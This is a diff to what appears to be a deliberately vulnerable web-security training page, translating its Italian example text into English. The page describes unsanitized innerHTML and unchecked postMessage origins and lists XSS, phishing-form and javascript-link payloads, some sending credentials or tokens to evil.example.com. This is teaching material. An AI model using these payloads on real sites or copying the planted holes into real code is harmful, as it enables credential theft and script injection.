@@ -98,10 +98,10 @@ if (name) {
     <p class="hint">Input is inserted into the DOM using <code>innerHTML</code> without sanitization.</p>
     <p class="hint"><strong>Examples:</strong></p>
     <ul class="examples">
-      <li><code>&lt;h1 style="color:red"&gt;INIETTATO&lt;/h1&gt;</code> — injected heading</li>
+      <li><code>&lt;h1 style="color:red"&gt;INJECTED&lt;/h1&gt;</code> — injected heading</li>
       <li><code>&lt;form action="https://evil.example.com"&gt;&lt;input name=user placeholder="Username"&gt;&lt;input type=password name=pw placeholder="Password"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;</code> — phishing form</li>
-      <li><code>&lt;a href="javascript:alert(1)"&gt;Clicca qui per il premio!&lt;/a&gt;</code> — malicious link</li>
-      <li><code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;Nome&lt;/td&gt;&lt;td&gt;ADMIN&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code> — visual data override</li>
+      <li><code>&lt;a href="javascript:alert(1)"&gt;Click here to win a prize!&lt;/a&gt;</code> — malicious link</li>
+      <li><code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;ADMIN&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code> — visual data override</li>
     </ul>
     <div class="lab-area">
       <textarea id="html-input" rows="3" placeholder="Insert HTML…"></textarea>
@@ -301,7 +301,7 @@ ws.onmessage = (e) => {
     <p class="hint">The page accepts <code>postMessage</code> from any origin without verifying <code>event.origin</code>.</p>
     <p class="hint"><strong>Examples (paste in the browser console):</strong></p>
     <ul class="examples">
-      <li><code>window.postMessage('&lt;b&gt;Iniettato!&lt;/b&gt;','*')</code> — HTML injection via postMessage</li>
+      <li><code>window.postMessage('&lt;b&gt;Injected!&lt;/b&gt;','*')</code> — HTML injection via postMessage</li>
       <li><code>window.postMessage('&lt;img src=x onerror=alert(document.domain)&gt;','*')</code> — XSS via postMessage</li>
       <li><code>window.postMessage('&lt;form action=https://evil.example.com&gt;&lt;input name=token&gt;&lt;button&gt;Send&lt;/button&gt;&lt;/form&gt;','*')</code> — injected phishing form</li>
     </ul>
